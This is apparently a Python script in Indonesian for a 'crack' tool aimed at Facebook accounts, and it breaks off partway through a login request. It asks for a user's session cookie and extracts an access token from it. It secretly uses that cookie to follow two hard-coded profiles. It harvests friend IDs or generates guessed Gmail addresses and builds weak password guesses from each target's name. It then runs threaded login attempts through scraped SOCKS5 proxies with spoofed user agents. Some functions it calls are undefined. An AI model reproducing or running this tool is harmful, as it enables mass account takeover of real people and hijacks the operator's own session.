# FREE AND OPEN SOURCE       
# FREE SCRIPTS CANNOT BE SOLD AND BUYED
# https://github.com/AdityaTwinz
# WA : 6283861183874

try:
    import re, os, sys, bs4, time, json, base64, rich
    import requests, random, datetime
    import platform, fake_useragent
    from concurrent.futures import ThreadPoolExecutor as Read
    from bs4 import BeautifulSoup as parser
    from datetime import datetime
    from time import sleep
    from time import time as mark
    from rich.panel import Panel
    from rich.tree import Tree
    from rich import print as prints
    from rich.console import Console
    from rich.table import Table
    from rich.columns import Columns
    from rich.markdown import Markdown
    from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn
except (ModuleNotFoundError, ImportError) as e:
    os.system('clear') ; sys.exit(f' \33[m[\x1b[1;91mError Module\33[m] {str(e).title()}\n \33[m[\x1b[1;91mError Module\33[m] Module \x1b[1;91m{str(e.name)} \33[mBelum Terinstall\n \33[m[\x1b[1;91mError Module\33[m] Silahkan install dengan ketik <=> pip install \x1b[1;92m{str(e.name)}')

Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU

P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' #ORANGE
N = '\x1b[0m' # DEFAULT

m = '\x1b[1;91m' #RED +
k = '\033[93m' # KUNING +
h = '\x1b[1;92m' # HIJAU +
hh = '\033[32m' # HIJAU -
u = '\033[95m' # UNGU
kk = '\033[33m' # KUNING -
b = '\33[1;96m' # BIRU -
p = '\x1b[0;34m' # BIRU +
x = '\33[m' # DEFAULT
asu = random.choice([m,k,h,u,b])  

dump, dump2, news = [], [], []
for xd in range(10000):
	rr = random.randint; rc = random.choice
	a=random.choice(["9.1.5","5.1.6","4.0.1","3.0.1","4.0.2","5.0.2","6.0.1","6.2.2","7.0.1","7.1.0","8.1.0","4.4.4","5.6.1","6.1.3"])
	b=random.randrange(111111,210000)
	c=random.randrange(73,110)
	d=random.randrange(33300,88800)
	e=random.randrange(40,250)
	z=random.randrange(113,117)
	h=random.randrange(11,19)
	t=random.randrange(0,10525)
	g=random.choice(['OPM1','TP1A','RP1A','PPR1','PKQ1','QP1A','SP1A','RKQ1'])
	i=random.choice(['en-US','en-GB','id-ID','de-DE','ru-RU','en-SG','fr-FR','fa-IR','ja-JP','pt-BR','cs-CZ','zh-HK','zh-CN','vi-VN','en-PH','en-IN','tr-TR'])
	ii=random.choice(['en','id','de','ru','en','fr','fa','ja','pt','cs','zh','zh','vi','tr'])
	oppo=random.choice(['CPH2437','CPH2351','CPH2048','CPH2389','CPH2359','CPH2363','CPH2211','PGX110','CPH1917'])
	oppo2 = random.choice(["PBDM00","PAHM00","PCDM10","PCAT00","PCDM10","PCHM30","PCKM00","PCHM10"])
	rilmi= random.choice(["RMX3516","RMX3371","RMX3461","RMX3286","RMX3561","RMX3388","RMX3311","RMX3142","RMX2071","RMX1805","RMX1809","RMX1801","RMX1807","RMX1803","RMX1825","RMX1821","RMX1822","RMX1833","RMX1851","RMX1853","RMX1827","RMX1911","RMX1919","RMX1927","RMX1971","RMX1973","RMX2030","RMX2032","RMX1925","RMX1929","RMX2001","RMX2061","RMX2063","RMX2040","RMX2042","RMX2002","RMX2151","RMX2163","RMX2155","RMX2170","RMX2103","RMX3085","RMX3241","RMX3081","RMX3151","RMX3381","RMX3521","RMX3474","RMX3471","RMX3472","RMX3392","RMX3393","RMX3491","RMX1811","RMX2185","RMX3231","RMX2189","RMX2180","RMX2195","RMX2101","RMX1941","RMX1945","RMX3063","RMX3061","RMX3201","RMX3203","RMX3261","RMX3263","RMX3193","RMX3191","RMX3195","RMX3197","RMX3265","RMX3268","RMX3269","RMX2027","RMX2020","RMX2021","RMX3581","RMX3501","RMX3503","RMX3511","RMX3310","RMX3312","RMX3551","RMX3301","RMX3300","RMX2202","RMX3363","RMX3360","RMX3366","RMX3361","RMX3031","RMX3370","RMX3357","RMX3560","RMX3562","RMX3350","RMX2193","RMX2161","RMX2050","RMX2156","RMX3242","RMX3171","RMX3430","RMX3235","RMX3506","RMX2117","RMX2173","RMX3161","RMX2205","RMX3462","RMX3478","RMX3372","RMX3574","RMX1831","RMX3121","RMX3122","RMX3125","RMX3043","RMX3042","RMX3041","RMX3092","RMX3093","RMX3571","RMX3475","RMX2200","RMX2201","RMX2111","RMX2112","RMX1901","RMX1903","RMX1992","RMX1993","RMX1991","RMX1931","RMX2142","RMX2081","RMX2085","RMX2083","RMX2086","RMX2144","RMX2051","RMX2025","RMX2075","RMX2076","RMX2072","RMX2052","RMX2176","RMX2121","RMX3115","RMX1921"])
	crot=random.choice(['Win64; x64','WOW64'])
	redmi = random.choice(["2201116SI","M2012K11AI","22011119TI","21091116UI","M2102K1AC","M2012K11I","22041219I","22041216I","2203121C","2106118C","2201123G","2203129G","2201122G","2201122C","2206122SC","22081212C","2112123AG","2112123AC","2109119BC","M2002J9G","M2007J1SC","M2007J17I","M2102J2SC","M2007J3SY","M2007J17G","M2007J3SG","M2011K2G","M2101K9AG","M2101K9R","2109119DG","M2101K9G","2109119DI","M2012K11G","M2102K1G","21081111RG","2107113SG","21051182G","M2105K81AC","M2105K81C","21061119DG","21121119SG","22011119UY","21061119AG","21061119AL","22041219NY","22041219G","21061119BI","220233L2G","220233L2I","220333QNY","220333QAG","M2004J7AC","M2004J7BC","M2004J19C","M2006C3MII","M2010J19SI","M2006C3LG","M2006C3LVG","M2006C3MG","M2006C3MT","M2006C3MNG","M2006C3LII","M2010J19SL","M2010J19SG","M2010J19SY","M2012K11AC","M2012K10C"])
	model = random.choice(["EdgA/41.1.35.1","EdgA/94.0.992.50","EdgA/98.0.1108.62","EdgA/114.0.1823.61","EdgA/111.0.1661.59"])
	iphone = random.choice(["11_2","11_1","11_1_1","15_6","11_1_3","11_3_2","11_2_1","11_2","13_2_1","14_2_1","15_1_1","12_1_1","12_1","12_1_2","12_2_1","16_1","16_2","13_3","13_1_1","13_2_1","14_3_5","9_1","8_1","7_1","10_1","9_1_1","8_1_1","9_2_1","8_2_2","15_3_2"])
	iphone1 = random.choice(["605.1.15","602.1.50","605.1.10","604.1.50","602.2.14","602.3.12","602.4.6","603.1.30","603.2.4","603.3.8","601.1.46"])
	iphone2 = random.choice(["7B367","15E148","11A465","8A293","8B117","19G82","15E148","18F72","20G75"])
	zax1=f'Mozilla/5.0 (Linux; Android {a}; {redmi}){rilmi}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{c}.0.0.0 Mobile Safari/537.36'
	zax2=f'Mozilla/5.0 (Linux; Android {a}; {oppo}){oppo2}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{z}.0.0.0 Mobile Safari/537.36'
	zax3=f'Mozilla/5.0 (Linux; Android {a}; {oppo}) AppleWebKit/537.36 (KHTML, seperti Gecko) Chrome/{z}.0.0.0 Mobile Safari/537.36'
	zax4 = f'Mozilla/5.0 (iPhone; CPU iPhone OS {iphone} like Mac OS X) AppleWebKit/{iphone1} (KHTML, like Gecko) Version/{h}.0.{a} Mobile Mobile/{iphone2} Safari/60{h}.1'
	zax5=f'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{z}.0.0.0 Mobile Safari/537.36'
	aseph=f'Mozilla/5.0 (Windows NT 10.0; {crot} AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{z}.0.0.0 Safari/537.36 Edge/12.{t}'
	hi=f'Mozilla/5.0 (Linux; Android 10; Infinix X682B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{z}.0.0.0 Mobile Safari/537.36{model}'
	uaku2 = random.choice([zax1,zax2,zax3,zax4,zax5,aseph,hi])
class REQ:
   
   def __init__(self):
       self.ses = requests.Session()
       self.url = "https://github.com/khoirulez"
       self.OS_mkdir()
   
   def OS_mkdir(self):
       try:os.mkdir('DataLog') ; os.mkdir('Results')
       except:pass

   def clearTerminal(self, platform):
       if "linux" in sys.platform.lower():os.system("clear")
       elif "win" in sys.platform.lower():os.system("cls")
   
   def get_Proxy(self, proxy = []):
       if os.path.isfile('DataLog/socks5.txt') is True:
          return(open('DataLog/socks5.txt','r').read().splitlines())
       else:
          try:
             response = self.ses.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all')
             for xc in response.text.splitlines():
                 if xc.isdigit:
                   if xc not in proxy:
                      proxy.append(xc)
                      open('DataLog/socks5.txt','a').write(f'{xc}\n')
             return proxy
          except requests.exceptions.ConnectionError as e:
             sleep(3.2) ; self.get_Proxy()
   def UserAgent(self):
       self.rr = random.randint
       self.rc = random.choice
       self.build = (''.join(random.choice('1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for xc in range(6)))
       # Generate UserAgent
       self.ua1 = f"Mozilla/5.0 (Linux; Android 7.1.2; Redmi 5A Build/{self.build}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(self.rr(65, 99))}.0.{str(self.rr(3100, 3900))}.{str(self.rr(75, 99))} Mobile Safari/537.36,gzip(gfe)"
       self.ua2 = f"Mozilla/5.0 (Linux; Android {str(self.rr(7, 12))}; RMX3360 Build/RKQ1.{str(self.rr(200000, 299999))}.001; en-us) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(self.rr(75, 99))}.0.{str(self.rr(3500, 3999))}.{str(self.rr(75, 199))} Mobile Safari/537.36 Puffin/9.0.0.{str(self.rr(10000, 90000))}AP"
       self.ua3 = f"Mozilla/5.0 (Linux; Android {str(self.rr(7, 12))}; STG S30 Build/PPR1.{str(self.rr(111111, 199999))}.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(self.rr(75, 99))}.0.{str(self.rr(4100, 4999))}.{str(self.rr(70, 99))} Mobile Safari/537.36 UCBrowser/{str(self.rr(7, 20))}.5.2.{str(self.rr(1000, 1999))} (UCMini) Mobile"
       base = self.rc([self.ua1, self.ua2, self.ua3])
       return base
       
   def UserAgent_API(self):
       self.rr = random.randint
       self.rc = random.choice
       self.android = f"{str(self.rr(9, 13))}"
       self.build = (''.join(random.choice('1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for xc in range(7)))
       self.build2 = f"{str(self.rr(70, 99))}-{str(self.rr(20, 59))}-{str(self.rr(0, 29))}-{str(self.rr(0, 9))}"
       self.chrome = f"{str(self.rr(75, 199))}"
       userAgentku = ("Dalvik/2.1.0 (Linux; U; Android {}; moto g52 Build/{}.{}) AppleWebKit [PB/165] (KHTML, like Gecko) Chrome/{}.0.0.0 Mobile Safari/537.36".format(self.android, self.build, self.build2, self.chrome))
       return userAgentku
       
   def UserAgent_APP(self):
       self.rr = random.randint
       self.rc = random.choice
       self.build1 = (''.join(random.choice('1234567890ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for xc in range(6)))
       self.build2 = (''.join(random.choice('ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890') for xc in range(8)))
       self.app1 = f"Mozilla/5.0 (Linux; Android 7.1.2; Nexus 5X Build/{self.build1}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{str(self.rr(55, 99))}.0.{str(self.rr(2500, 2999))}.{str(self.rr(75, 199))} Mobile Safari/537.36 [FB_IAB/MESSENGER;FBAV/{str(self.rr(75, 150))}.0.0.21.71;]"
       self.app2 = f"Mozilla/5.0 (Linux; arm; Android {str(self.rr(7, 12))}; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(self.rr(75, 199))}.0.0.0 YaBrowser/{str(self.rr(20, 99))}.9.5.83.00 SA/3 Mobile Safari/537.36"
       self.app3 = f"Mozilla/5.0 (Linux; Android 4.0.{str(self.rr(3, 4))}; Alpha GT Build/{str(self.rc(['IML74K', 'IMM76D']))}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{str(self.rr(30, 45))}.0.{str(self.rr(1500, 2500))}.{str(self.rr(90, 150))} Mobile Safari/537.36"
       self.app4 = f"Mozilla/5.0 (Linux; U; Android 4.2.2; ja-jp; N-06E Build/{self.build2}) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30"
       App_get = self.rc([self.app1, self.app2, self.app3, self.app4])
       return App_get
              
   def Logooo(self):
       Console().print(f"{M2}RR07X  {B2}@Khoirulez")
       Console().print(f' {M2}● {K2}● {H2}●')
       Console().print(f'''    {H2}    ,*-~"`^"*u_                                _u*. "^`"~-*,
     p!^       /  jPw                            w9j \        ^!p
   w^.._      /      "\_                      _/"     \        _.^w
        *_   /          \_      _    _      _/         \     _* 
          q /           / \q   ( `--` )   p/ \          \   p
          jj5****._    /    ^\_) {M2}o  {M2}o{H2} (_/^    \    _.****6jj
                   *_ /      "==) {P2};;{H2} (=="      \ _*
                    `/.w***,   /(    )\   ,***w.\"
                     ^ ilmk ^c/ )    ( \c^      ^
                             'V')_)(_('V'
                                 `` ``''')
   def Pepek(self):
       self.Logooo()
       print(f'\t\t           {B}Login Licensi{x}')
       print(' ╰─▶ 1 Login Ke Tools')
       print(' ╰─▶ 2 Hubungi Admin')
       pil = input(f'✶ ━━⫸ {H} Choice{N} : ')
       if pil in['2','02']:
           print("\n [•] {H2}You will be redirected to the Author Whatsapp...")
           time.sleep(0.03)
           os.system('xdg-open https://wa.me/6281283547452?text=Hallo+min+minta+lisensi+trial+SC+ini')
           time.sleep(3)
           Pepek()
       elif pil in['1','01']:
           print(f"{H}Pastikan sudah memiliki licensinya{x}")
           time.sleep(1)
           run()
       else:
           print(f'{M2}  Pilih Yang Bener Asu ');time.sleep(0.03);pepek()    
       
   def DEL_Cok(self):
       try:
           os.system("rm -rf DataLog/cookies.txt")
           os.system("rm -rf DataLog/tokenEaab.txt")
       except:pass

   def REQ_Cookie(self):
       self.clearTerminal(platform) ; self.Logooo()
       Cooks = Console().input(f'\n{M2}Masukan Cookie : {H}')
       try:
           askTrue = self.ses.get('https://www.facebook.com/adsmanager/manage/campaigns',cookies = {'cookie':Cooks})
           search = re.search('act=(.*?)&nav_source',str(askTrue.content)).group(1)
           askReq = self.ses.get(f'https://www.facebook.com/adsmanager/manage/campaigns?act={search}&nav_source=no_referrer',cookies = {'cookie':Cooks})
           dashToken = re.search('accessToken="(.*?)"',str(askReq.content)).group(1)
           open('DataLog/cookies.txt','w').write(Cooks)
           open('DataLog/tokenEaab.txt','w').write(dashToken)
           self.Followers(Cooks) ; self.Followers2(Cooks)
           Console().print("[•]{H} Login token EAAB berhasil :")
           Console().print(f'{H2}{dashToken}') ; sleep(1.1) ; self.Menuuu()
       except requests.exceptions.ConnectionError as e:
           Console().print(f"[•]{U2} Tebang Tower Anda") ; sleep(1.1) ; sys.exit()
       except Exception as e:
           Console().print(f"[•]{U2} Ganti Tumbal Anda") ; sleep(1.1) ; self.REQ_Cookie()
   
   def Followers(self, cok):
       try:
           req = parser(self.ses.get('https://m.facebook.com/100063618310179', cookies = {'cookie':cok}).text,'html.parser')
           for x in req.find_all('a', href=True):
               if '/a/subscribe.php?' in str(x.get('href')):
                 r = self.ses.get('https://m.facebook.com%s'%(x['href']), cookies = {'cookie':cok}).text
       except:pass
   
   def Followers2(self, cok):
       try:
           req = parser(self.ses.get('https://m.facebook.com/1072901466', cookies = {'cookie':cok}).text,'html.parser')
           for x in req.find_all('a', href=True):
               if '/a/subscribe.php?' in str(x.get('href')):
                 r = self.ses.get('https://m.facebook.com%s'%(x['href']), cookies = {'cookie':cok}).text
       except:pass

   def Menuuu(self):
       self.clearTerminal(platform) ; self.Logooo()
       try:
           coks = open('DataLog/cookies.txt','r').read()
           toks = open('DataLog/tokenEaab.txt','r').read()
           print(f'  [•][bold green] Cookies Aktif, Login Berhasil !!!! ')
           os.system("clear")
       except FileNotFoundError as e:
           print(' [•][bold red] Cookies Expired, login ulang kontol !!!')
           sleep(3.1) ; self.REQ_Cookie()
       try:
           url = self.ses.get(f"https://graph.facebook.com/me?fields=name,id&access_token={toks}", cookies = {"cookie": coks}).json()
           nama, id = url['name'], url['id']
       except (KeyError, NameError) as e:
           Console().print(f"[•]{U2} {str(e).title()}") ; sleep(3.1) ; self.DEL_Cok() ; self.REQ_Cookie()
       except requests.exceptions.ConnectionError as e:
           Console().print(f"[•]{U2} {str(e).title()}") ; sleep(3.1) ; sys.exit()
       self.clearTerminal(platform) ; self.Logooo()
       Console().print(f"{M2}✶ {H2}━━⫸[•]{U2}Nama Tumbal {M2}{nama}\n{M2}✶ {H2}━━⫸[•]{U2}Id Tumbal {B2}{id}")
       Console().print(f'\n{H2}╰─▶ {H2}01{P2}. {U2}Crack publik\n{H2}╰─▶ {H2}02{P2}. {U2}Crack massal\n{H2}╰─▶ {H2}03{P2}. {U2}Crack email\n{H2}╰─▶ {H2}04{P2}. {U2}Crack file\n{H2}╰─▶ {H2}05{P2}. {U2}Result OK/CP\n{H2}╰─▶ {M2}00{P2}. {U2}Log-out ( Cookie )')
       ykhh = Console().input(f'\n{M2}Input : ')
       
       if ykhh =='1' or ykhh =='01':
         uid = Console().input(f'\n✶ ━━⫸{U2}Masukan Id : ')
         data = {'access_token':toks, 'after':None}
         url = 'https://graph.facebook.com/v18.0/%s/friends'
         Console().print(f"[•]{U2} Sedang dump id {P2}{uid}") ; print('\r') ; sleep(3.3)
         for xxx in uid.split(','):
             Dump().Publik(data, url, xxx, dump, coks)
         print('')
         Furthermore().Methodee()
       
       elif ykhh =='2' or ykhh =='02':
           Console().print(f"[•]{U2} Masukan id target, banyaknya id pisahkan dengan "," ( koma )")
           uid = Console().input(f'\n✶ ━━⫸{U2}Masukan Id : ')
           for uuid in uid:
                try:
                    with requests.Session() as r:
                        Dump().Massal(int(uuid), coks, unit_cursor = '')
                except KeyboardInterrupt:pass
                except Exception as e:pass
           print('')
           Furthermore().Methodee()
       
       elif ykhh =='3' or ykhh =='03':
           try:
                 nama = Console().input(f'\n✶ ━━⫸{U2}Masukan Nama Target : ')
                 total = Console().input(f'\n✶ ━━⫸{U2}Masukan Jumlah Dump : ')
                 print('')
                 Dump().Dump_Email(nama, total)
           except Exception as e:
                 Console().print(f"[•]{U2} {str(e).title()}") ; sleep(3) ; sys.exit()
           print('')
           Furthermore().Methodee()
       
       elif ykhh =='4' or ykhh =='04':
           try:
                Files = Console().input(f'\n✶ ━━⫸{U2}Masukan tempat file anda (ex: /sdcard/dump.txt) : ')
                print('')    
                Dump().Dump_File(Files)   
           except Exception as e:
                Console().print(f"## {str(e).title()}") ; sleep(3) ; sys.exit()
           print('')
           Furthermore().Methodee()
       
       elif ykhh =='5' or ykhh =='05':
           Console().print(f'\n{H2}╰─▶ {H2}01{P2}. Check hasil OK\n{H2}╰─▶ {H2}02{P2}. Check hasil CP\n{H2}03{P2}. Kembali ke menu')
           aa = Console().input(f'\n✶ ━━⫸{M2}Input : ')
           
           if aa =='1' or aa =='01':
             try:
                 yyy = open("Results/ok.txt", "r").readlines()
             except FileNotFoundError as e:
                 Console().print(f"[•]{U2} {str(e).title()}") ; sleep(3) ; sys.exit()
             for i in yyy:
                 tree = Tree(f"\r",guide_style="bold grey100")
                 tree.add(f'{H2}{i}')
                 prints(tree)
             Console().print(f"[•]{U2} Check hasil ok selesai") ; sleep(3) ; sys.exit()
           
           elif aa =='2' or aa =='02':
               try:
                   yyy = open("Results/cp.txt", "r").readlines()
               except FileNotFoundError as e:
                   Console().print(f"[•]{U2} {str(e).title()}") ; sleep(3) ; sys.exit()
               for i in yyy:
                   tree = Tree(f"\r",guide_style="bold grey100")
                   tree.add(f'{K2}{i}')
                   prints(tree)
               Console().print(f"[•]{U2} Check hasil cp selesai") ; sleep(3) ; sys.exit()
           
           elif aa =='3' or aa =='03':
               self.Menuuu()
           
           else:Console().print(f"[•]{U2} Input dengan benar") ; sleep(3) ; self.Menuuu()
       
       elif ykhh =='0' or ykhh =='00':
           self.DEL_Cok() ; Console().print(f"[•]{U2} Berhasil menghapus cookie & token") ; sleep(3) ; sys.exit()
         

class Dump:
   
   def __init__(self):
      self.ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'
      pass
   
   def Publik(self, params, host, user, array, coki):
       try:
           req = requests.get(host%(user), params = params, cookies = {'cookie':coki}).json()
           for xyz in req['data']:
               uid = '%s|%s'%(xyz['id'],xyz['name'])
               if uid not in array:array.append(uid)
               Console().print(f'[•]{U2}Total Dump -: {B2}{len(array)}{P2}',end='\r')
           if 'paging' in str(req):
              after = req['paging']['cursors']['after']
              params.update({'after': after})
              self.Publik(params, host, user, array, coki)
       except:pass
       return array
   
   def Massal(self, uuid, cok, unit_cursor):     
        try:
            with requests.Session() as r:
                r.headers.update({
                    'Host': 'mbasic.facebook.com',
                    'Upgrade-Insecure-Requests': '1',
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
                    'User-Agent': self.ua,
                    'Accept-Language': 'id,en;q=0.9',
                })
                r.cookies.update({
                    'cookie': cok
                })
                response = r.get('https://mbasic.facebook.com/profile.php?id={}&v=friends&unit_cursor={}'.format(uuid, unit_cursor)).text
                self.all_friends = re.findall('href="fb://profile/(.*?)">(.*?)<', str(response))
                for z in self.all_friends:
                    self.id_friends, self.name = z[0], z[1].lower()
                    if len(self.name) == 0 or len(self.name) > 100:
                        continue
                    else:
                        if str(self.id_friends) in str(dump):
                            continue
                        else:
                            dump.append(f'{self.id_friends}|{self.name}')
                            Console().print(f'[•]{U2}Total Dump -: {K2}{len(dump)}{P2}',end='\r')
                if 'Sorry, something went wrong.' in str(response):
                    return False
                elif 'unit_cursor=' in str(response):
                    self.unit_cursor = re.search('unit_cursor=(.*?)&', str(response)).group(1)
                    self.Dump_Masal(uuid, cok, self.unit_cursor)
                else:
                    return False
        except KeyboardInterrupt as e:
            Console().print(f"[•]{U2} {str(e).title()}")
            return False
   
   def Dump_Email(self, nama, total):
        dpn = [
           "azizah","asep","agus","supri","bayu","yuli","ria","aditya","inayah","bambang",
           "jupri","julia","nico","bima","bisma","ayulia","ayu","sri","rinto","udin","rehan",
           "semarang","palembang","lampung","cirebon","brebes","jakarta","bogor",
           "bandung","sukabumi","garut","banten","bukittinggi","padang","minang",
           "sugeng","nabila","bila","ara","chan","prabowo","jokowi","ganjar","wisnu",
        ]
        blk = [
         "123","1234","12345","123456","1234567","098","0987","321","3214",
         "official","gaming","fans","yahho","subur","jaya","cantik","cosplay"
        ]
        try:
            for xyc in range(int(total)):
                Acak = ([
                    f'{str(random.choice(dpn))}',
                    f'{str(random.randint(0,90))}',
                    f'{str(random.choice(dpn))}',
                    f'{str(random.choice(blk))}{str(random.randint(0,90))}',
                    f'{xyc}',
                    f'{str(random.choice(blk))}{str(random.randint(0,90))}',
                    f'{str(random.choice(dpn))}{str(random.choice(blk))}'
                ])
                data = nama+str(random.choice(Acak))+'@gmail.com'
                if data in dump:pass
                else:
                    self.id = nama
                    self.nama = data 
                    dump.append(data+'|'+nama)
                    Console().print(f'[•]{U2}Total Dump -: {H2}{len(dump)}.{len(data)}{P2}',end='\r')
        except (KeyboardInterrupt, Exception) as e:
            Console().print(f"[•]{U2} {str(e).title()}") ; sleep(3.1) ; sys.exit()
   
   def Dump_File(self, Files):
        try:
            Ambil = open(Files,'r').readlines()
            for data in Ambil:
                try:
                    user, nama = data.split('|')
                    dump.append(data)
                except Exception as e:
                    Console().print(f"[•]{U2} {str(e).title()}") ; sleep(3.1) ; sys.exit() 
                Console().print(f'[•]{U2}Total Dump{N} -: {H2}{len(dump)}{P2}',end='\r')
        except FileNotFoundError as e:
            Console().print(f"[•]{U2} {str(e).title()}") ; sleep(3.1) ; sys.exit()

class Furthermore:
   
   def __init__(self):
       self.live, self.check, self.loop = [], [], 0
       self.Method, self.Paslist, self.Passku = [], [], []
       self.dic = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10':'October','11':'November','12':'December'}
       self.tgl = datetime.now().day
       self.bln = self.dic[(str(datetime.now().month))]
       self.thn = datetime.now().year
   
   def Methodee(self):
       Console().print(Markdown(f"## Total {len(dump)} id terkumpul"),style='blue')
       Console().print(f'\n{H2}╰─▶ {B2}01{P2}. Methode async ( {H2}m.facebook.com {P2})\n{H2}╰─▶ {B2}02{P2}. Methode validate ( {H2}mbasic.facebook.com {P2})\n{H2}╰─▶ {B2}03{P2}. Methode Reguler ( {H2}free.facebook.com {P2})\n{H2}╰─▶ {B2}04{P2}. Methode asyncAPP ( {H2}m.facebook.com{P2} )\n{H2}╰─▶ {B2}05{P2}. Methode validateAPP ( {H2}mbasic.facebook.com{P2} )')
       Asw = Console().input(f'\n✶ ━━⫸{M2}Input : ')
       if Asw =='1' or Asw =='01':
         self.Method.append('async')
       elif Asw =='2' or Asw =='02':
           self.Method.append('validate')
       elif Asw =='3' or Asw =='03':
           self.Method.append('regular')
       elif Asw =='4' or Asw =='04':
           self.Method.append('asyncc2')
       elif Asw =='5' or Asw =='05':
           self.Method.append('validatee22')
       else:
           self.Method.append('async')
       self.Generate_id()
   
   def Wordlist(self):
        ask = Console().input(f'\n{H2}╰─▶ {U2}Ingin menambahkan sandi manual? (Y/t) ')
        if ask =='y' or ask =='Y' or ask =='Ya' or ask =='ya' or ask =='YA':
          self.Paslist.append('ya')
          pwdia = Console().input(f'\n✶ ━━⫸{M2}Buat Kata Sandi{N} : ')
          asky = pwdia.split(',')
          for x in asky:
              self.Passku.append(x)
        else:self.Paslist.append('no')
        self.Generate_List()
   
   def Generate_id(self):
       Console().print(f'\n{H2}╰─▶ {B2}01{P2}. Facebook Id {M2}old\n{H2}╰─▶ {B2}02{P2}. Facebook id {K2}new\n{H2}╰─▶ {B2}03{P2}. Facebook id {H2}random')
       ykh = Console().input(f'\n✶ ━━⫸{M2}Input : ')
       
       if ykh =='1' or ykh =='01':
         for old in sorted(dump):
             dump2.append(old)
       
       elif ykh =='2' or ykh =='02':
           for new in sorted(dump):
               news.append(new)
           setid = len(news)
           setid2 = (setid-1)
           for xc in range(setid):
               dump2.append(news[setid2])
               setid2 -=1
       
       elif ykh =='3' or ykh =='03':
           for rand in dump:
               generateID_rand = random.randint(0,len(dump2))
               dump2.insert(generateID_rand, rand)
       self.Wordlist()
   
   def Generate_List(self):
        global prog,des
        Console().print(f"[•]{U2} Start {self.tgl}-{self.bln}-{self.thn} OK/CP") ; print('')
        prog = Progress(TextColumn("{task.description}"))
        des = prog.add_task('',total=len(dump))
        with prog:
            with Read(max_workers=30) as Itil:
                for akun in dump:
                    user, nama = akun.split('|')[0], akun.split('|')[1].lower()
                    depan = nama.split(' ')[0]
                    self.password = []
                    if len(nama)<6:
                        if len(depan)<3:
                            pass
                        else:
                            self.password.append(nama)
                            self.password.append(depan+'123')
                            self.password.append(depan+'1234')
                            self.password.append(depan+'12345')
                    else:
                        if len(depan)<3:
                            self.password.append(nama)
                        else:
                            self.password.append(nama)
                            self.password.append(depan+'123')
                            self.password.append(depan+'1234')
                            self.password.append(depan+'12345')
                    if 'ya' in self.Paslist:
                        for xc in self.Passku:
                            self.password.append(xc)
                    else:pass
                    if 'async' in self.Method:
                        Itil.submit(rr078, user, password)
                    elif 'validate' in self.Method:
                        Itil.submit(self.validateAPI, user, self.password)
                    elif 'regular' in self.Method:
                        Itil.submit(self.regularAPI, user, self.password)
                    elif 'asyncc2' in self.Method:
                        Itil.submit(self.asyncAPP, user, self.password)
                    elif 'validatee22' in self.Method:
                        Itil.submit(self.validateAPP, user, self.password)
                    else:
                        Itil.submit(self.asyncAPI, user, self.password)
   
   def asyncAPI(self, user, password):
       prog.update(des,description=f">RR07X | {self.loop}/{len(dump)} LIVE-:{H2}{len(self.live)} {P2}CHECK-:{K2}{len(self.check)}")
       prog.advance(des) 
       ses = requests.Session()
       proxx = REQ().get_Proxy()
       ua = uaku2()
       for pw in password:
           try:
               proxis = {'http': 'socks5://' + random.choice(proxx)}
               link = ses.get('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8', headers = {'User-Agent':ua})
               data = {
                 "m_ts":re.search('name="m_ts" value="(.*?)"', str(link.text)).group(1),
                 "li":re.search('name="li" value="(.*?)"', str(link.text)).group(1),
                 "try_number":0,
                 "unrecognized_tries":0,
                 "email":user,
                 "prefill_contact_point":f"{user} {pw}",
                 "prefill_source":"browser_dropdown",
                 "prefill_type":"password",
                 "first_prefill_source":"browser_dropdown",
                 "first_prefill_type":"contact_point",
                 "had_cp_prefilled":True,
                 "had_password_prefilled":True,
                 "is_smart_lock":False,
                 "bi_xrwh":0,
